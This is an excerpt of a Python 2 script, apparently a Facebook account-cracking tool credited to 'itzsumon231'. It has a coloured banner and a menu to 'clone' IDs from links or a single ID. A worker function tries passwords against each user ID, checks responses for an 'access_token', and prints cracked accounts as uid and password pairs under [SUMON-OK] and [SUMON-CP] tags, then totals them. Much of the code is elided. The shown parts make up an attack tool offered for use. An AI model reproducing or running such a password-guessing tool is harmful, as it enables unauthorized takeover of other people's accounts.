...
\033[1;92m\_____ _______ ______   _____ _    _ __  __  ____  _   _   _  ___    _          _   _ 
...
\033[1;92mAuthor \033[1;93m: itzsumon231

\033[1;92mFb \033[1;93m: Akash Chowdhury 
...
#Main Board Jaha Sy Script Start Hobe
...
def crack():
    ...
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Itz Sumon .& Also Tom Vai
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks Itz Sumon 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;32m[SUMON-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                print '\x1b[1;31m[SUMON-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[SUMON-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[SUMON-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks Itz Sumon .& Also Tom Vai
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Itz sumon & Tom Vai
